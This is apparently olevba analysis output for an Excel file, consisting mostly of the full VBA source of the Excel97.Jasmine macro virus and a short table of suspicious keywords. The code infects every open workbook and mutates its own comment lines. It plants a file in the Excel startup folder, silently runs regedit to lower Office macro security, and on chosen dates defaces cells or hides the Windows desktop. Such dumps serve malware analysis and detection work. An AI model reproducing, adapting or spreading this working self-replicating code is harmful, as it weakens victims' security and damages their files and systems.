olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSExcel.Jasmine.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSExcel.Jasmine.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Excel97.Jasmine v1.1
'Copyright (c) 1999, cry0tek

Public Start, CloseFlag As Boolean
'Jasmine
Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)

On Error Resume Next

RegFile = "c:\remove.reg"

For i = 1 To Workbooks.Count

 Set Inf = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule

 Randomize

 With Inf

  For x = 7 To 221 Step 2

   For y = 1 To Int((100 * Rnd) + 1)

    PolyVal = PolyVal + Chr(65 + Int(Rnd * 26)) & Chr(122 - Int(Rnd * 26)) & Chr(48 + Int(Rnd * 10))

   Next

   .replaceLine x, "'" & PolyVal

   PolyVal = ""

  Next

 End With

 If Inf.Lines(5, 1) = "'Jasmine" Then vx = Inf.Lines(1, Inf.countoflines)

 If Inf.countoflines > 100 Then GoTo out

 For j = 1 To Workbooks(i).VBProject.VBComponents.Count

  Set Item = Workbooks(i).VBProject.VBComponents.Item(j)

  InfName = Item.Name

  Set Infline = Item.CodeModule

  If InStr(1, InfName, "Sheet") Then

   If Infline.Lines(5, 1) = "'Jasmine" Then vx = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.Lines(1, Infline.countoflines)

  End If

  If Infline.countoflines > 100 Then GoTo out

 Next

Next

out:

If UCase(Dir(Application.StartupPath + "\Book1.")) <> UCase("BOOK1") Then

 If Start <> True Then

  Start = True: CloseFlag = True

  Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\BOOK1.", FileFormat:=xlNormal, AddToMru:=False

 End If

End If

For i = 1 To Workbooks.Count

 Set Inf = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule

 If Inf.Lines(5, 1) <> "'Jasmine" Then

  Inf.InsertLines 1, vx

  Inf.replaceLine 6, "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"

 End If

  For ii = 1 To Workbooks(i).VBProject.VBComponents.Count

   Set Item = Workbooks(i).VBProject.VBComponents.Item(ii)

   InfName = Item.Name

   Set Infline = Item.CodeModule

   If Infline.Lines(5, 1) <> "'Jasmine" Then

    If InStr(1, InfName, "Sheet") Then

     Item.CodeModule.InsertLines 1, vx

     Item.CodeModule.replaceLine 6, "Private Sub WorkBook_Activate()"

    End If

   End If

  Next ii

Next i

If CloseFlag = True Then

 CloseFlag = False

 Workbooks("Book1.").Close savechanges:=True

 Open RegFile For Output As 1

 Print #1, "REGEDIT4"

 If Left(Application.Version, 1) = 9 Then

  Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"

  Print #1, """Level""=dword:00000001"

 Else

  Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"

  Print #1, """Options6""=dword:00000000"

  Print #1, "[HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User\Settings\Excel\Microsoft Excel]"

  Print #1, """Options6""=dword:00000000"

  Print #1, "[HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"

  Print #1, """Options6""=dword:00000000"

 End If

 Close 1

 Shell "regedit /s " & RegFile, vbHide

 Kill RegFile

End If

If Minute(Now) = Second(Now) Then

 Select Case Day(Now)

  Case 1 To 5 And Int((5 * Rnd) + 1) = 1

   Application.StatusBar = "Excel97.Jasmine v1.1"

  Case 6 To 10 And Int((5 * Rnd) + 1) = 1

   With Assistant.NewBalloon

    .Heading = "Excel97.Jasmine v1.1"

    .Text = "Since the only time I see her near" & vbCr & "Is when I close my eyes" & vbCr & "Should I keep it that way" & vbCr & "The only way I can make her stay..." & vbCr & vbCr

    .Animation = 22

    .Show

   End With

  Case 11 To 20 And Int((5 * Rnd) + 1) = 1

   For i = 1 To 600 Step Int((Rnd * 2) + 1)

    lct = Chr(65 + Int(Rnd * 26))

    j = lct & (Int(Rnd * 20) + 1)

    Range(j).Select

    ActiveCell.FormulaR1C1 = "Excel97.Jasmine"

    Range(j).Select

    With Selection.Font

     .Name = "Arial"

     .Size = 10

    End With

    Range(j).Select

    With Selection.Interior

     .ColorIndex = Int((Rnd * 56) + 1)

     .Pattern = xlSolid

    End With

    Columns(lct & ":" & lct).EntireColumn.AutoFit

    Selection.Font.ColorIndex = Int((Rnd * 56) + 1)

   Next

  Case 21 To 30 And Int((5 * Rnd) + 1) = 1

   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoDesktop") = 1&

  Case 31 And Int((5 * Rnd) + 1) = 1

   MsgBox ""

 End Select

End If

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |WorkBook_Activate   |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |remove.reg          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

